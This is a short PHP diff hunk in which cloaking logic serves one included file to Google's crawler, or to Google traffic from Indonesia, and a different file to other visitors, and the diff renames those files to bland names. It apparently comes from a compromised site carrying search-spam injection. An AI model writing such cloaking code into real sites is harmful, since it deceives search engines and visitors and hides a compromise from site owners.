@@ -63,7 +63,7 @@ function is_from_indonesia_and_google() {
     return false;
 }
 if (is_google_bot() || is_from_indonesia_and_google()) {
-    include __DIR__ . '/about.php';
+    include __DIR__ . '/theme.php';
 } else {
-    require __DIR__ . '/admin.php';
+    require __DIR__ . '/status.php';
 }
